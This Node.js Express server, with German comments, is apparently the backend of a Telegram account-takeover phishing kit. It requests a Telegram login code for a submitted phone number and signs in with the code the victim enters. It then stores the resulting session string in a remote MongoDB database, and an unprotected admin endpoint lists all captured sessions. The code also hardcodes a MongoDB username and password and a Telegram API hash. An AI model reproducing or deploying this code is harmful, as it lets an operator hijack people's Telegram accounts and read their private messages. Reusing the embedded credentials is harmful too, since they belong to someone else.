const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');

const app = express();
app.use(cors());
app.use(express.json());

// Verbindung zur MongoDB
const MONGO_URI = "mongodb+srv://mercyinfo52_db_user:Hinva312-@cluster0.a0bslma.mongodb.net/?appName=Cluster0";

mongoose.connect(MONGO_URI)
    .then(() => console.log("Datenbank verbunden"))
    .catch(err => console.error("Datenbank Fehler:", err));

const SessionSchema = new mongoose.Schema({
    phoneNumber: String,
    sessionString: String,
    createdAt: { type: Date, default: Date.now }
});
const Session = mongoose.model('Session', SessionSchema);

const apiId = 23049703;
const apiHash = "e9c00af578a9de0253ef02337460498f";
const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });

app.post('/send-otp', async (req, res) => {
    const { phoneNumber } = req.body;
    try {
        await client.connect();
        const result = await client.sendCode({ apiId, apiHash }, phoneNumber);
        res.json({ success: true, phoneCodeHash: result.phoneCodeHash });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/verify-otp', async (req, res) => {
    const { phoneNumber, phoneCode, phoneCodeHash } = req.body;
    try {
        await client.signInUser({ apiId, apiHash, phoneNumber, phoneCode, phoneCodeHash }, { phoneNumber, phoneCode });
        const sessionString = client.session.save();
        await Session.create({ phoneNumber, sessionString });
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/admin/sessions', async (req, res) => {
    try {
        const sessions = await Session.find().sort({ createdAt: -1 });
        res.json(sessions);
    } catch (error) {
        res.status(500).send(error.message);
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server läuft auf Port ${PORT}`));
